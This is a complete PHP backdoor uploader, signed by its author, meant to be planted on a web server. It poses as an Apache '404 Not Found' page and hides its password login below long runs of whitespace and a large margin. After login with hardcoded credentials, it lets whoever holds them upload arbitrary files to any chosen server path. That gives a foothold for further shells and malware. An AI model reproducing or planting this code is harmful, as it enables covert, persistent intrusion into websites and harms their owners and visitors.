<?php
//BY_KODAK
session_start();
// ***************************************** //
// **********	DECLARE VARIABLES  ********** //
// ***************************************** //




// ****************************************************** Change username and password ******************************************************
$username = 'Kodak';
$password = '@k0d4k';
// ****************************************************** Change username and password ******************************************************



$random1 = 'HAHAHAHA';
$random2 = 'HEHEHEHE';
$hash = md5($random1.$password.$random2);


// ************************************ //
// **********	USER LOGOUT  ********** //
// ************************************ //
if(isset($_GET['logout']))
{
	unset($_SESSION['login']);
}
// ******************************************* //
// **********	USER IS LOGGED IN	********** //
// ******************************************* //
if (isset($_SESSION['login']) && $_SESSION['login'] == $hash) {
	?>
	
		<style>
		body{background: black;text-align: center;color:#6AFE7C;font-size :25px}
		</style>
		
		<center>
		<p style='color:#EAA50E' >Hello <?php echo $username; ?> :]</p><p style='color:#E6DD28'>You Have Successfully Logged In!</p><br>
		<?php
		$files = @$_FILES["files"];
		if ($files["name"] != '') {
		$fullpath = $_REQUEST["path"] . $files["name"];
		if (move_uploaded_file($files['tmp_name'], $fullpath)) {
		echo "<h2><a style='color:#2DF7FB' href='$fullpath'>OK-Click here!</a></h2>";
		}
		}
		echo '<title>Uploader</title>
		<br><br><form method=POST enctype="multipart/form-data" action="">
		<input type="file" name="files">
		<input type="submit" style="color:#B65CB7" value="..:: Upload ::.."></form>';
		?>
		<br><br><br><br><br><br><br>
		<a href="?logout=true" style='color:red;font-size:17px'>LogOut?</a>
			
	<?php
}
// *********************************************** //
// **********	FORM HAS BEEN SUBMITTED	********** //
// *********************************************** //
else if (isset($_POST['submit'])) {
	if ($_POST['username'] == $username && $_POST['password'] == $password){
	
		//IF USERNAME AND PASSWORD ARE CORRECT SET THE LOG-IN SESSION
		$_SESSION["login"] = $hash;
		header("Location: $_SERVER[PHP_SELF]");
		
	} else {
		
		// DISPLAY FORM WITH ERROR
		display_login_form();
		//echo 'PassWord & UserName Are Incorrect';
		
	}
}	
	
	
// *********************************************** //
// **********	SHOW THE LOG-IN FORM	********** //
// *********************************************** //
else { 
	display_login_form();
}
function display_login_form(){ ?>
<HTML>
<HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD>
<BODY>
<H1>Not Found</H1>
The requested document was not found on this server.
<P>
<HR>
<ADDRESS>
Apache/2.0.54 Server at																																																													<script>document.write(window.location.hostname)</script>
</ADDRESS>
</BODY>
</HTML>
																																																																		<style>input[type=text], input[type=password] {width: 9%;padding: 2px 4px;margin: 2px 0 0px 0;display: inline-block;border: 0px solid #ccc;box-sizing: border-box;padding-top: 0px;font-size: 13px;color:black;}.kodak {margin-top: 542px;}</style><div class="kodak" align="right"><form action="" method='post'><br><input type="text" style='color:#B4B4B4' placeholder="." name="username" id="username"><br /><input type="password" style='color:#B4B4B4' placeholder="." name="password" id="password"><input type="submit" name="submit" hidden /></form></div>
<?php } ?>
